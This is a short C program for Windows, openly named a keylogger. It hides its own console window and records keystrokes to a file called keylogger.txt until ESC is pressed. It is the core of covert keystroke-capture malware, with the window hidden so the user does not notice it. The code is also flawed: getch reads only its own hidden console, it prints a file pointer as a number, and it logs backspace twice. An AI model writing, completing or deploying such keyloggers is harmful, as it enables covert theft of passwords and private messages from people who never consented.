#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

int main()
{
    char capture;
    FILE *file;
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    
    file = fopen("keylogger.txt", "w");
    fprintf(file, "Started logging");
    printf("started logging %u",file);
    

    while (1)
    {
        if (kbhit())
        {
            capture = getch();
            switch ((int)capture)
            {
            case ' ': 
                fprintf(file, " ");
                break;
            case 0x09:
                fprintf(file, "[TAB]");
                break;
            case 0x0D:
                fprintf(file, "[ENTER]");
                break;
            case 0x1B: 
                fprintf(file, "[ESC]");
                break;
            case 0x08:
                fprintf(file, "[BACKSPACE]");
                break;
            default:
                fputc(capture, file);
            }
            if((int)capture == 0x08)
            {
                fprintf(file,"bsp");
            }

            if ((int)capture == 27)
            {
                fputs("\nstopped",file);
                fclose(file);
                printf("\nstopped loging");
                return 0;
            }
        }
    }
}
